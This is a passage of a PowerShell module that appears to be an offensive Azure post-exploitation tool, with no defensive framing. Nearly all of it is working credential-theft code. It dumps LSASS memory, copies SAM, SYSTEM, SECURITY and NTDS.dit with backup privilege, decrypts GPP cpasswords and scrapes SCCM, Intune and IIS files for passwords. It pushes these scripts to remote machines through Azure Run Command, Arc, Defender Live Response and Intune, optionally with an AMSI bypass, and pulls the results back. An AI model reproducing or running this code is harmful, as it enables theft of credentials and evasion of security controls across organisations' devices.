        Write-Output "Failed to open LSASS process - insufficient privileges"
        return
    }

    $fileStream = New-Object IO.FileStream($dumpPath, [IO.FileMode]::Create)
    $fileHandle = $fileStream.SafeFileHandle.DangerousGetHandle()

    # MiniDumpWithFullMemory = 0x00000002
    $dumpResult = [Win32.DbgHelp]::MiniDumpWriteDump($processHandle, $lsassPID, $fileHandle, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    $fileStream.Close()

    if (-not $dumpResult -or -not (Test-Path $dumpPath)) {
        Write-Output "---ERROR---"
        Write-Output "MiniDumpWriteDump failed - Credential Guard may be active"
        return
    }

    $dumpSize = (Get-Item $dumpPath).Length
    Write-Output "---LSASS_STAGED---"
    Write-Output "DUMP_PATH:$dumpPath"
    Write-Output "DUMP_SIZE:$dumpSize"
    Write-Output "DUMP_METHOD:direct"
    Write-Output "---SUCCESS---"
} catch {
    Write-Output "---ERROR---"
    Write-Output $_.Exception.Message
}
'@
        }
    }

    return $preamble + $methodScript
}

<#
.SYNOPSIS
    Parse LSASS dump output.
.PARAMETER Output
    Raw output from the LSASS extraction script.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Parse-LSASSOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        StagedDumpPath = $null
        DumpSizeMB = $null
        DumpMethod = $null
        RequiresFileTransfer = $false
        LocalDumpPath = $null
        Credentials = @()
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "LSASS extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---LSASS_STAGED---") {
            $result.RequiresFileTransfer = $true
            $stagedSection = ($Output -split "---LSASS_STAGED---")[1]
            $stagedSection = ($stagedSection -split "---SUCCESS---")[0]

            if ($stagedSection -match "DUMP_PATH:(.+)") {
                $result.StagedDumpPath = $Matches[1].Trim()
            }
            if ($stagedSection -match "DUMP_SIZE:(\d+)") {
                $result.DumpSizeMB = [math]::Round([int64]$Matches[1] / 1MB, 2)
            }
            if ($stagedSection -match "DUMP_METHOD:(.+)") {
                $result.DumpMethod = $Matches[1].Trim()
            }
            $result.Success = $true
        }
    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Execute LSASS memory dump on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER LsassMethod
    Dump method: comsvcs, procdump, nanodump, direct.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-LSASSExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [ValidateSet("comsvcs", "procdump", "nanodump", "direct")]
        [string]$LsassMethod = "comsvcs",

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "LSASS"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "LSASS extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-LSASSExtractionScript -LsassMethod $LsassMethod

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-lsass-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-LSASSOutput -Output $output

        # Handle staged dump file transfer
        if ($parsed.RequiresFileTransfer -and $parsed.StagedDumpPath) {
            Write-ColorOutput -Message "    [*] LSASS dump requires file transfer ($($parsed.DumpSizeMB) MB)..." -Color "Yellow"

            $localDir = "$env:TEMP\azx_lsass_$($Target.Name)_$(Get-Date -Format 'yyyyMMddHHmmss')"
            New-Item -ItemType Directory -Path $localDir -Force | Out-Null
            $localDump = Join-Path $localDir "lsass.dmp"

            if ($Target.Type -eq "AzureVM") {
                $transferResult = Receive-VMFile -VMName $Target.Name `
                    -ResourceGroup $Target.ResourceGroup `
                    -OSType $Target.OSType `
                    -RemotePath $parsed.StagedDumpPath `
                    -LocalPath $localDump `
                    -MaxFileSizeMB 200
                if ($transferResult.Success) {
                    $parsed.LocalDumpPath = $localDump
                    Write-ColorOutput -Message "    [+] Downloaded LSASS dump to: $localDump" -Color "Green"
                } else {
                    Write-ColorOutput -Message "    [!] Transfer failed: $($transferResult.Error)" -Color "Red"
                }
            } elseif ($Target.Type -eq "Arc") {
                $transferResult = Receive-DeviceFile -MachineName $Target.Name `
                    -ResourceGroup $Target.ResourceGroup `
                    -Location $Target.Location `
                    -OSType $Target.OSType `
                    -RemotePath $parsed.StagedDumpPath `
                    -LocalPath $localDump `
                    -MaxFileSizeMB 200
                if ($transferResult.Success) {
                    $parsed.LocalDumpPath = $localDump
                    Write-ColorOutput -Message "    [+] Downloaded LSASS dump to: $localDump" -Color "Green"
                } else {
                    Write-ColorOutput -Message "    [!] Transfer failed: $($transferResult.Error)" -Color "Red"
                }
            }

            # Try to parse with pypykatz if available
            $pypykatzPath = Test-PypykatzAvailable
            if ($pypykatzPath -and $parsed.LocalDumpPath -and (Test-Path $parsed.LocalDumpPath)) {
                Write-ColorOutput -Message "    [*] Parsing LSASS dump with pypykatz..." -Color "Cyan"
                $pypykatzOutput = & $pypykatzPath lsa minidump $parsed.LocalDumpPath 2>&1
                $pypykatzStr = $pypykatzOutput | Out-String

                # Parse pypykatz output for credentials
                $currentPackage = $null
                foreach ($line in $pypykatzOutput) {
                    $lineStr = "$line"
                    if ($lineStr -match "^== (MSV|WDigest|Kerberos|DPAPI|LiveSSP|SSP|CredMan) ==") {
                        $currentPackage = $Matches[1]
                    }
                    if ($currentPackage -and $lineStr -match "Username:\s*(.+)") {
                        $credUsername = $Matches[1].Trim()
                    }
                    if ($currentPackage -and $lineStr -match "Domain:\s*(.+)") {
                        $credDomain = $Matches[1].Trim()
                    }
                    if ($currentPackage -and $lineStr -match "NT:\s*([a-fA-F0-9]{32})") {
                        if ($credUsername -and $credUsername -ne "(null)") {
                            $parsed.Credentials += [PSCustomObject]@{
                                Type = $currentPackage
                                Username = $credUsername
                                Domain = $credDomain
                                NTHash = $Matches[1]
                                Password = $null
                            }
                        }
                    }
                    if ($currentPackage -and $lineStr -match "Password:\s*(.+)" -and $Matches[1].Trim() -ne "(null)" -and $Matches[1].Trim() -ne "None") {
                        if ($credUsername -and $credUsername -ne "(null)") {
                            $parsed.Credentials += [PSCustomObject]@{
                                Type = $currentPackage
                                Username = $credUsername
                                Domain = $credDomain
                                NTHash = $null
                                Password = $Matches[1].Trim()
                            }
                        }
                    }
                }
            } elseif ($parsed.LocalDumpPath) {
                Write-ColorOutput -Message "    [*] pypykatz not found - use offline: pypykatz lsa minidump $($parsed.LocalDumpPath)" -Color "Yellow"
            }
        }

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# BACKUP OPERATOR (NetExec -M backup_operator equivalent)
# ============================================

<#
.SYNOPSIS
    Generate PowerShell script for Backup Operator extraction.
.DESCRIPTION
    Creates a PowerShell script that uses SeBackupPrivilege to copy registry hives
    and optionally NTDS.dit from Domain Controllers using backup semantics.
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-BackupOperatorScript {
    return @'
$tempDir = "$env:TEMP\azx_backup_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
try {
    # Check SeBackupPrivilege
    $privOutput = whoami /priv 2>&1 | Out-String
    $hasBackupPriv = $privOutput -match "SeBackupPrivilege\s+.*Enabled"

    # Check if DC
    $isDC = $false
    $ntdsService = Get-Service -Name "NTDS" -ErrorAction SilentlyContinue
    if ($ntdsService -and $ntdsService.Status -eq "Running") {
        $isDC = $true
    }

    Write-Output "---BACKUP_INFO---"
    Write-Output "BACKUP_PRIV:$hasBackupPriv"
    Write-Output "IS_DC:$isDC"

    if (-not $hasBackupPriv) {
        Write-Output "---ERROR---"
        Write-Output "SeBackupPrivilege is not enabled for current context"
        return
    }

    # Use robocopy /B (backup semantics) to copy hives
    robocopy "C:\Windows\System32\config" "$tempDir" SAM SYSTEM SECURITY /B /COPY:D /NFL /NDL /NP /R:0 /W:0 2>&1 | Out-Null

    if (-not (Test-Path "$tempDir\SAM") -or -not (Test-Path "$tempDir\SYSTEM")) {
        # Fallback to reg.exe
        reg.exe save HKLM\SAM "$tempDir\SAM" /y 2>&1 | Out-Null
        reg.exe save HKLM\SYSTEM "$tempDir\SYSTEM" /y 2>&1 | Out-Null
        reg.exe save HKLM\SECURITY "$tempDir\SECURITY" /y 2>&1 | Out-Null
    }

    if (-not (Test-Path "$tempDir\SAM") -or -not (Test-Path "$tempDir\SYSTEM")) {
        Write-Output "---ERROR---"
        Write-Output "Failed to copy registry hives even with backup privilege"
        return
    }

    # Base64 encode hives for transfer
    $sam = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SAM"))
    $system = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SYSTEM"))
    $security = ""
    if (Test-Path "$tempDir\SECURITY") {
        $security = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$tempDir\SECURITY"))
    }

    Write-Output "---BACKUP_SAM---"
    Write-Output $sam
    Write-Output "---BACKUP_SYSTEM---"
    Write-Output $system
    Write-Output "---BACKUP_SECURITY---"
    Write-Output $security

    # If DC, also stage NTDS.dit
    if ($isDC) {
        $ntdsPath = "$tempDir\ntds.dit"
        robocopy "C:\Windows\NTDS" "$tempDir" ntds.dit /B /COPY:D /NFL /NDL /NP /R:0 /W:0 2>&1 | Out-Null
        if (Test-Path $ntdsPath) {
            $ntdsSize = (Get-Item $ntdsPath).Length
            Write-Output "---BACKUP_NTDS_STAGED---"
            Write-Output "NTDS_PATH:$ntdsPath"
            Write-Output "NTDS_SIZE:$ntdsSize"
        }
    }

    Write-Output "---SUCCESS---"
} catch {
    Write-Output "---ERROR---"
    Write-Output $_.Exception.Message
} finally {
    # Don't cleanup temp yet if NTDS is staged for transfer
}
'@
}

<#
.SYNOPSIS
    Parse Backup Operator extraction output.
.PARAMETER Output
    Raw output from the Backup Operator extraction script.
.PARAMETER TempDir
    Temporary directory to save decoded hives.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Parse-BackupOperatorOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output,

        [Parameter(Mandatory = $false)]
        [string]$TempDir = "$env:TEMP\azx_backup_$(Get-Random)"
    )

    $result = @{
        Success = $false
        HasBackupPrivilege = $false
        IsDomainController = $false
        Hashes = @()
        SAMPath = $null
        SYSTEMPath = $null
        SECURITYPath = $null
        NTDSStagedPath = $null
        RawHashes = ""
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
    }

    if ($Output -match "BACKUP_PRIV:True") {
        $result.HasBackupPrivilege = $true
    }
    if ($Output -match "IS_DC:True") {
        $result.IsDomainController = $true
    }

    if ($Output -notmatch "---SUCCESS---") {
        if (-not $result.Error) {
            $result.Error = "Backup extraction did not complete successfully"
        }
        return [PSCustomObject]$result
    }

    try {
        New-Item -ItemType Directory -Path $TempDir -Force | Out-Null

        # Extract hives (reuse SAM parsing logic)
        if ($Output -match "---BACKUP_SAM---\s*([A-Za-z0-9+/=]+)\s*---BACKUP_SYSTEM---") {
            $samB64 = $Matches[1].Trim()
            $samBytes = [Convert]::FromBase64String($samB64)
            $result.SAMPath = Join-Path $TempDir "SAM"
            [IO.File]::WriteAllBytes($result.SAMPath, $samBytes)
        }

        if ($Output -match "---BACKUP_SYSTEM---\s*([A-Za-z0-9+/=]+)\s*---BACKUP_SECURITY---") {
            $systemB64 = $Matches[1].Trim()
            $systemBytes = [Convert]::FromBase64String($systemB64)
            $result.SYSTEMPath = Join-Path $TempDir "SYSTEM"
            [IO.File]::WriteAllBytes($result.SYSTEMPath, $systemBytes)
        }

        if ($Output -match "---BACKUP_SECURITY---\s*([A-Za-z0-9+/=]+)\s*---(?:BACKUP_NTDS_STAGED|SUCCESS)---") {
            $securityB64 = $Matches[1].Trim()
            if ($securityB64) {
                $securityBytes = [Convert]::FromBase64String($securityB64)
                $result.SECURITYPath = Join-Path $TempDir "SECURITY"
                [IO.File]::WriteAllBytes($result.SECURITYPath, $securityBytes)
            }
        }

        # Check for NTDS staging
        if ($Output -match "---BACKUP_NTDS_STAGED---") {
            if ($Output -match "NTDS_PATH:(.+)") {
                $result.NTDSStagedPath = $Matches[1].Trim()
            }
        }

        # Try to parse hashes using secretsdump (reuse SAM parsing)
        $secretsdumpPath = Test-SecretsdumpAvailable
        if ($secretsdumpPath -and $result.SAMPath -and $result.SYSTEMPath) {
            $hashOutput = & python $secretsdumpPath -sam $result.SAMPath -system $result.SYSTEMPath LOCAL 2>&1
            $result.RawHashes = $hashOutput | Out-String

            foreach ($line in $hashOutput) {
                if ("$line" -match "^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::$") {
                    $result.Hashes += [PSCustomObject]@{
                        Username = $Matches[1]
                        RID = $Matches[2]
                        LMHash = $Matches[3]
                        NTHash = $Matches[4]
                        HashLine = "$line"
                    }
                }
            }
        }

        $result.Success = $true

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Execute Backup Operator extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-BackupOperatorExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "BACKUP"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "Backup Operator extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-BackupOperatorScript

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-backup-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $tempDir = "$env:TEMP\azx_backup_$($Target.Name)_$(Get-Date -Format 'yyyyMMddHHmmss')"
        $parsed = Parse-BackupOperatorOutput -Output $output -TempDir $tempDir

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# SCCM/INTUNE SECRETS (NetExec --sccm equivalent)
# ============================================

<#
.SYNOPSIS
    Generate PowerShell script for SCCM/Intune credential extraction.
.DESCRIPTION
    Creates a PowerShell script that searches for SCCM cache, GPP cpasswords,
    Intune deployed scripts, and IIS configs with embedded credentials.
.PARAMETER SCCMMethod
    Extraction method: disk (default), api
.OUTPUTS
    String containing the PowerShell script.
#>
function Get-SCCMExtractionScript {
    param(
        [Parameter(Mandatory = $false)]
        [ValidateSet("disk", "api")]
        [string]$SCCMMethod = "disk"
    )

    if ($SCCMMethod -eq "disk") {
        return @'
$results = @{
    GPPPasswords = @()
    SCCMCacheFindings = @()
    IntuneScripts = @()
    IISConfigs = @()
    Hostname = $env:COMPUTERNAME
}

# 1. GPP cpassword files in SYSVOL
try {
    $sysvolPath = "$env:SystemRoot\SYSVOL"
    if (Test-Path $sysvolPath) {
        $gppFiles = @("Groups.xml", "Services.xml", "Scheduledtasks.xml", "DataSources.xml", "Printers.xml", "Drives.xml")
        $gppSearchPaths = Get-ChildItem -Path $sysvolPath -Recurse -Include $gppFiles -ErrorAction SilentlyContinue

        foreach ($gppFile in $gppSearchPaths) {
            $content = Get-Content -Path $gppFile.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match 'cpassword="([^"]+)"') {
                $cpassword = $Matches[1]
                $username = ""
                if ($content -match 'userName="([^"]+)"') { $username = $Matches[1] }
                elseif ($content -match 'accountName="([^"]+)"') { $username = $Matches[1] }
                elseif ($content -match 'runAs="([^"]+)"') { $username = $Matches[1] }

                # Decrypt GPP cpassword (known AES key published by Microsoft)
                try {
                    $pad = 4 - ($cpassword.Length % 4)
                    if ($pad -lt 4) { $cpassword += "=" * $pad }
                    $decodedBytes = [Convert]::FromBase64String($cpassword)

                    # Microsoft published AES key for GPP
                    $aesKey = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                      0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
                    $aesIV = New-Object byte[] 16
                    $aes = [System.Security.Cryptography.Aes]::Create()
                    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                    $aes.Key = $aesKey
                    $aes.IV = $aesIV
                    $decryptor = $aes.CreateDecryptor()
                    $decrypted = $decryptor.TransformFinalBlock($decodedBytes, 0, $decodedBytes.Length)
                    $password = [System.Text.Encoding]::Unicode.GetString($decrypted)
                } catch {
                    $password = "[encrypted] $cpassword"
                }

                $results.GPPPasswords += @{
                    File = $gppFile.FullName
                    Username = $username
                    Password = $password
                }
            }
        }
    }
} catch {}

# 2. SCCM client cache
try {
    $sccmCache = "C:\Windows\ccmcache"
    if (Test-Path $sccmCache) {
        $scriptFiles = Get-ChildItem -Path $sccmCache -Recurse -Include "*.ps1","*.bat","*.cmd","*.vbs","*.config","*.xml" -ErrorAction SilentlyContinue
        foreach ($sf in $scriptFiles) {
            $content = Get-Content -Path $sf.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match '(?i)(password|passwd|secret|credential|api.?key)\s*[=:]\s*["\x27]?([^\s"\x27]+)') {
                $results.SCCMCacheFindings += @{
                    Path = $sf.FullName
                    Type = "Embedded credential pattern"
                    Match = $Matches[0].Substring(0, [Math]::Min(100, $Matches[0].Length))
                }
            }
        }
    }
} catch {}

# 3. Intune Management Extension deployed scripts
try {
    $intuneScriptsPath = "C:\Program Files (x86)\Microsoft Intune Management Extension\Policies\Scripts"
    if (Test-Path $intuneScriptsPath) {
        $intuneFiles = Get-ChildItem -Path $intuneScriptsPath -Recurse -Include "*.ps1","*.bat","*.cmd" -ErrorAction SilentlyContinue
        foreach ($inf in $intuneFiles) {
            $content = Get-Content -Path $inf.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match '(?i)(password|passwd|secret|credential|api.?key|connectionstring)\s*[=:]\s*["\x27]?([^\s"\x27]+)') {
                $results.IntuneScripts += @{
                    Path = $inf.FullName
                    Finding = $Matches[0].Substring(0, [Math]::Min(100, $Matches[0].Length))
                }
            }
        }
    }

    # Also check Intune Win32 app content
    $intuneAppsPath = "C:\Program Files (x86)\Microsoft Intune Management Extension\Content"
    if (Test-Path $intuneAppsPath) {
        $appFiles = Get-ChildItem -Path $intuneAppsPath -Recurse -Include "*.ps1","*.config","*.xml" -ErrorAction SilentlyContinue | Select-Object -First 50
        foreach ($af in $appFiles) {
            $content = Get-Content -Path $af.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match '(?i)(password|passwd|secret|credential|connectionstring)\s*[=:]\s*["\x27]?([^\s"\x27]+)') {
                $results.IntuneScripts += @{
                    Path = $af.FullName
                    Finding = $Matches[0].Substring(0, [Math]::Min(100, $Matches[0].Length))
                }
            }
        }
    }
} catch {}

# 4. IIS applicationHost.config with service account credentials
try {
    $iisConfigs = @(
        "$env:SystemRoot\System32\inetsrv\config\applicationHost.config",
        "$env:SystemRoot\System32\inetsrv\config\administration.config"
    )
    foreach ($iisConf in $iisConfigs) {
        if (Test-Path $iisConf) {
            $content = Get-Content -Path $iisConf -Raw -ErrorAction SilentlyContinue
            # Look for application pool identities
            $regex = [regex]'<processModel\s+[^>]*userName="([^"]+)"[^>]*password="([^"]+)"'
            $matches = $regex.Matches($content)
            foreach ($m in $matches) {
                $results.IISConfigs += @{
                    Path = $iisConf
                    Username = $m.Groups[1].Value
                    Password = $m.Groups[2].Value
                }
            }
            # Look for virtual directory credentials
            $regex2 = [regex]'<virtualDirectory\s+[^>]*userName="([^"]+)"[^>]*password="([^"]+)"'
            $matches2 = $regex2.Matches($content)
            foreach ($m2 in $matches2) {
                $results.IISConfigs += @{
                    Path = $iisConf
                    Username = $m2.Groups[1].Value
                    Password = $m2.Groups[2].Value
                }
            }
        }
    }
} catch {}

Write-Output "---SCCM---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@
    } else {
        # API method - marker for local Graph API enumeration
        return @'
Write-Output "---SCCM_API---"
Write-Output "REQUIRES_GRAPH_API"
Write-Output "---SUCCESS---"
'@
    }
}

<#
.SYNOPSIS
    Parse SCCM extraction output.
.PARAMETER Output
    Raw output from the SCCM extraction script.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Parse-SCCMOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        GPPPasswords = @()
        SCCMCacheFindings = @()
        IntuneScripts = @()
        IISConfigs = @()
        GraphAPIFindings = @()
        RequiresGraphAPI = $false
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "SCCM extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        # Check for API marker
        if ($Output -match "---SCCM_API---") {
            $result.RequiresGraphAPI = $true
            $result.Success = $true
            return [PSCustomObject]$result
        }

        # Parse disk findings
        if ($Output -match "---SCCM---\s*(.+)\s*---SUCCESS---") {
            $sccmData = $Matches[1].Trim()
            $parsed = $sccmData | ConvertFrom-Json

            $result.GPPPasswords = if ($parsed.GPPPasswords) { $parsed.GPPPasswords } else { @() }
            $result.SCCMCacheFindings = if ($parsed.SCCMCacheFindings) { $parsed.SCCMCacheFindings } else { @() }
            $result.IntuneScripts = if ($parsed.IntuneScripts) { $parsed.IntuneScripts } else { @() }
            $result.IISConfigs = if ($parsed.IISConfigs) { $parsed.IISConfigs } else { @() }
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse SCCM JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

<#
.SYNOPSIS
    Execute SCCM/Intune credential extraction on a single target.
.PARAMETER Target
    Target object with VM/Device information.
.PARAMETER SCCMMethod
    Extraction method: disk, api.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.OUTPUTS
    PSCustomObject with extraction results.
#>
function Invoke-SCCMExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [ValidateSet("disk", "api")]
        [string]$SCCMMethod = "disk",

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "SCCM"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows" -and $SCCMMethod -eq "disk") {
        $result.Error = "SCCM disk extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($SCCMMethod -eq "api") {
            # API method - enumerate Intune profiles via Graph API locally
            Write-ColorOutput -Message "    [*] Enumerating Intune configuration via Graph API..." -Color "Cyan"

            $graphData = @{
                GraphAPIFindings = @()
            }

            try {
                # Enumerate device configurations
                $configs = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceConfigurations" -ErrorAction Stop
                foreach ($config in $configs.value) {
                    if ($config.'@odata.type' -match "wifi|vpn|certificate") {
                        $graphData.GraphAPIFindings += [PSCustomObject]@{
                            Name = $config.displayName
                            Type = $config.'@odata.type'
                            Id = $config.id
                        }
                    }
                }

                # Enumerate device management scripts
                $scripts = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts" -ErrorAction Stop
                foreach ($s in $scripts.value) {
                    $graphData.GraphAPIFindings += [PSCustomObject]@{
                        Name = $s.displayName
                        Type = "deviceManagementScript"
                        Id = $s.id
                    }
                }
            } catch {
                $graphData.GraphAPIFindings = @()
            }

            $parsed = [PSCustomObject]@{
                Success = $true
                GPPPasswords = @()
                SCCMCacheFindings = @()
                IntuneScripts = @()
